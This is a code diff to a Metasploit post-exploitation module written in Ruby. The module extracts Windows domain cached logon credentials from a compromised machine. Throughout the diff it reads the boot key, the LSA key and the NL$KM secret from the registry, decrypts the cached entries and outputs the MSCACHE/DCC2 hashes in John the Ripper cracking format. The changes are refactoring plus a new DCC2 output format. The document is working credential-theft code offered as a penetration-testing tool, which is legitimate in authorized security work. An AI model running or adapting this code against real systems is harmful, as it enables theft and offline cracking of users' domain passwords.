@@ -41,29 +41,19 @@ class Metasploit3 < Msf::Post
 
 
   def check_gpo
-    begin
-      winlogonkey = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", KEY_READ)
-      gposetting = winlogonkey.query_value('CachedLogonsCount').data
-      print_status("Cached Credentials Setting: #{gposetting.to_s} - (Max is 50 and 0 disables, and 10 is default)")
-      #ValueName: CachedLogonsCount
-      #Data Type: REG_SZ
-      #Values: 0 - 50
-    rescue ::Exception => e
-      print_error("Cache setting not found...")
-    end
+    gposetting = registry_getvaldata("HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "CachedLogonsCount")
+    print_status("Cached Credentials Setting: #{gposetting} - (Max is 50 and 0 disables, and 10 is default)")
   end
 
   def capture_nlkm(lsakey)
-    ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SECURITY\\Policy\\Secrets\\NL$KM\\CurrVal", KEY_READ)
-    nlkm = ok.query_value("").data
-    ok.close
+    nlkm = registry_getvaldata("HKLM\\SECURITY\\Policy\\Secrets\\NL$KM\\CurrVal", "")
 
     print_status("Encrypted NL$KM: #{nlkm.unpack("H*")[0]}") if( datastore['DEBUG'] )
 
-    if( @vista == 1 )
-      nlkm_dec = decrypt_lsa_data( nlkm[0..-1], lsakey)
+    if lsa_vista_style?
+      nlkm_dec = decrypt_lsa_data(nlkm, lsakey)
     else
-      nlkm_dec = decrypt_secret_data( nlkm[0xC..-1], lsakey)
+      nlkm_dec = decrypt_secret_data(nlkm[0xC..-1], lsakey)
     end
 
     return nlkm_dec
@@ -72,10 +62,10 @@ class Metasploit3 < Msf::Post
   def parse_decrypted_cache(dec_data, s)
 
     i = 0
-    hash = dec_data[i...i+0x10]
-    i+=72
+    hash = dec_data[i,0x10]
+    i += 72
 
-    username = dec_data[i...i+(s.userNameLength)].split("\x00\x00").first.gsub("\x00", '')
+    username = dec_data[i,s.userNameLength].split("\x00\x00").first.gsub("\x00", '')
     i+=s.userNameLength
     i+=2 * ( ( s.userNameLength / 2 ) % 2 )
 
@@ -85,60 +75,60 @@ class Metasploit3 < Msf::Post
     last = Time.at(s.lastAccess)
     vprint_good "Last login\t\t: #{last.strftime("%F %T")} "
 
-    domain = dec_data[i...i+s.domainNameLength+1]
+    domain = dec_data[i,s.domainNameLength+1]
     i+=s.domainNameLength
 
     if( s.dnsDomainNameLength != 0)
-      dnsDomainName = dec_data[i...i+s.dnsDomainNameLength+1].split("\x00\x00").first.gsub("\x00", '')
+      dnsDomainName = dec_data[i,s.dnsDomainNameLength+1].split("\x00\x00").first.gsub("\x00", '')
       i+=s.dnsDomainNameLength
       i+=2 * ( ( s.dnsDomainNameLength / 2 ) % 2 )
       vprint_good "DNS Domain Name\t: #{dnsDomainName}"
     end
 
     if( s.upnLength != 0)
-      upn = dec_data[i...i+s.upnLength+1].split("\x00\x00").first.gsub("\x00", '')
+      upn = dec_data[i,s.upnLength+1].split("\x00\x00").first.gsub("\x00", '')
       i+=s.upnLength
       i+=2 * ( ( s.upnLength / 2 ) % 2 )
       vprint_good "UPN\t\t\t: #{upn}"
     end
 
     if( s.effectiveNameLength != 0 )
-      effectiveName = dec_data[i...i+s.effectiveNameLength+1].split("\x00\x00").first.gsub("\x00", '')
+      effectiveName = dec_data[i,s.effectiveNameLength+1].split("\x00\x00").first.gsub("\x00", '')
       i+=s.effectiveNameLength
       i+=2 * ( ( s.effectiveNameLength / 2 ) % 2 )
       vprint_good "Effective Name\t: #{effectiveName}"
     end
 
     if( s.fullNameLength != 0 )
-      fullName = dec_data[i...i+s.fullNameLength+1].split("\x00\x00").first.gsub("\x00", '')
+      fullName = dec_data[i,s.fullNameLength+1].split("\x00\x00").first.gsub("\x00", '')
       i+=s.fullNameLength
       i+=2 * ( ( s.fullNameLength / 2 ) % 2 )
       vprint_good "Full Name\t\t: #{fullName}"
     end
 
     if( s.logonScriptLength != 0 )
-      logonScript = dec_data[i...i+s.logonScriptLength+1].split("\x00\x00").first.gsub("\x00", '')
+      logonScript = dec_data[i,s.logonScriptLength+1].split("\x00\x00").first.gsub("\x00", '')
       i+=s.logonScriptLength
       i+=2 * ( ( s.logonScriptLength / 2 ) % 2 )
       vprint_good "Logon Script\t\t: #{logonScript}"
     end
 
     if( s.profilePathLength != 0 )
-      profilePath = dec_data[i...i+s.profilePathLength+1].split("\x00\x00").first.gsub("\x00", '')
+      profilePath = dec_data[i,s.profilePathLength+1].split("\x00\x00").first.gsub("\x00", '')
       i+=s.profilePathLength
       i+=2 * ( ( s.profilePathLength / 2 ) % 2 )
       vprint_good "Profile Path\t\t: #{profilePath}"
     end
 
     if( s.homeDirectoryLength != 0 )
-      homeDirectory = dec_data[i...i+s.homeDirectoryLength+1].split("\x00\x00").first.gsub("\x00", '')
+      homeDirectory = dec_data[i,s.homeDirectoryLength+1].split("\x00\x00").first.gsub("\x00", '')
       i+=s.homeDirectoryLength
       i+=2 * ( ( s.homeDirectoryLength / 2 ) % 2 )
       vprint_good "Home Directory\t\t: #{homeDirectory}"
     end
 
     if( s.homeDirectoryDriveLength != 0 )
-      homeDirectoryDrive = dec_data[i...i+s.homeDirectoryDriveLength+1].split("\x00\x00").first.gsub("\x00", '')
+      homeDirectoryDrive = dec_data[i,s.homeDirectoryDriveLength+1].split("\x00\x00").first.gsub("\x00", '')
       i+=s.homeDirectoryDriveLength
       i+=2 * ( ( s.homeDirectoryDriveLength / 2 ) % 2 )
       vprint_good "Home Directory Drive\t: #{homeDirectoryDrive}"
@@ -150,9 +140,9 @@ class Metasploit3 < Msf::Post
     relativeId = []
     while (s.groupCount > 0) do
       # Todo: parse attributes
-      relativeId << dec_data[i...i+4].unpack("V")[0]
+      relativeId << dec_data[i,4].unpack("V")[0]
       i+=4
-      attributes = dec_data[i...i+4].unpack("V")[0]
+      attributes = dec_data[i,4].unpack("V")[0]
       i+=4
       s.groupCount-=1
     end
@@ -160,7 +150,7 @@ class Metasploit3 < Msf::Post
     vprint_good "Additional groups\t: #{relativeId.join ' '}"
 
     if( s.logonDomainNameLength != 0 )
-      logonDomainName = dec_data[i...i+s.logonDomainNameLength+1].split("\x00\x00").first.gsub("\x00", '')
+      logonDomainName = dec_data[i,s.logonDomainNameLength+1].split("\x00\x00").first.gsub("\x00", '')
       i+=s.logonDomainNameLength
       i+=2 * ( ( s.logonDomainNameLength / 2 ) % 2 )
       vprint_good "Logon domain name\t: #{logonDomainName}"
@@ -185,7 +175,12 @@ class Metasploit3 < Msf::Post
         ]
 
     vprint_good "----------------------------------------------------------------------"
-    return "#{username.downcase}:#{hash.unpack("H*")[0]}:#{dnsDomainName}:#{logonDomainName}\n"
+    if lsa_vista_style?
+      return "#{username.downcase}:$DCC2$##{username.downcase}##{hash.unpack("H*")[0]}:#{dnsDomainName}:#{logonDomainName}\n"
+    else
+      return "#{username.downcase}:#{hash.unpack("H*")[0]}:#{dnsDomainName}:#{logonDomainName}\n"
+    end
+
   end
 
   def parse_cache_entry(cache_data)
@@ -258,10 +253,10 @@ class Metasploit3 < Msf::Post
     rc4key = OpenSSL::HMAC.digest(OpenSSL::Digest::Digest.new('md5'), nlkm, ch)
     rc4 = OpenSSL::Cipher::Cipher.new("rc4")
     rc4.key = rc4key
-    dec  = rc4.update(edata)
-    dec << rc4.final
+    decrypted  = rc4.update(edata)
+    decrypted << rc4.final
 
-    return dec
+    return decrypted
   end
 
   def decrypt_hash_vista(edata, nlkm, ch)
@@ -271,13 +266,12 @@ class Metasploit3 < Msf::Post
     aes.decrypt
     aes.iv = ch
 
-    jj = ""
-    for i in (0...edata.length).step(16)
-      xx = aes.update(edata[i...i+16])
-      jj += xx
+    decrypted = ""
+    (0...edata.length).step(16) do |i|
+      decrypted << aes.update(edata[i,16])
     end
 
-    return jj
+    return decrypted
   end
 
 
@@ -304,14 +298,14 @@ class Metasploit3 < Msf::Post
     ])
 
     begin
-      print_status("Executing module against #{session.sys.config.sysinfo['Computer']}")
+      print_status("Executing module against #{sysinfo['Computer']}")
       client.railgun.netapi32()
       if client.railgun.netapi32.NetGetJoinInformation(nil,4,4)["BufferType"] != 3
         print_error("System is not joined to a domain, exiting..")
         return
       end
 
-      #Check policy setting for cached creds
+      # Check policy setting for cached creds
       check_gpo
 
       print_status('Obtaining boot key...')
@@ -320,6 +314,11 @@ class Metasploit3 < Msf::Post
 
       print_status('Obtaining Lsa key...')
       lsakey = capture_lsa_key(bootkey)
+      if lsakey.nil?
+        print_error("Could not retrieve LSA key. Are you SYSTEM?")
+        return
+      end
+
       print_status("Lsa Key: #{lsakey.unpack("H*")[0]}") if( datastore['DEBUG'] )
 
       print_status("Obtaining LK$KM...")
@@ -349,7 +348,7 @@ class Metasploit3 < Msf::Post
           print_status("Encrypted data: #{cache.enc_data.unpack("H*")[0]}") if( datastore['DEBUG'] )
           print_status("Ch:  #{cache.ch.unpack("H*")[0]}") if( datastore['DEBUG'] )
 
-          if( @vista == 1 )
+          if lsa_vista_style?
             dec_data = decrypt_hash_vista(cache.enc_data, nlkm, cache.ch)
           else
             dec_data = decrypt_hash(cache.enc_data, nlkm, cache.ch)
@@ -357,27 +356,26 @@ class Metasploit3 < Msf::Post
 
           print_status("Decrypted data: #{dec_data.unpack("H*")[0]}") if( datastore['DEBUG'] )
 
-          john += parse_decrypted_cache(dec_data, cache)
+          john << parse_decrypted_cache(dec_data, cache)
 
         end
       end
 
-      print_status("John the Ripper format:")
-
-      john.split("\n").each do |pass|
-        print "#{pass}\n"
-      end
-
-      if( @vista == 1 )
+      if lsa_vista_style?
         print_status("Hash are in MSCACHE_VISTA format. (mscash2)")
         p = store_loot("mscache2.creds", "text/csv", session, @credentials.to_csv, "mscache2_credentials.txt", "MSCACHE v2 Credentials")
         print_status("MSCACHE v2 saved in: #{p}")
 
+        john = "# mscash2\n" + john
       else
         print_status("Hash are in MSCACHE format. (mscash)")
         p = store_loot("mscache.creds", "text/csv", session, @credentials.to_csv, "mscache_credentials.txt", "MSCACHE v1 Credentials")
         print_status("MSCACHE v1 saved in: #{p}")
+        john = "# mscash\n" + john
       end
+
+      print_status("John the Ripper format:")
+      print_line john
 
     rescue ::Interrupt
       raise $!
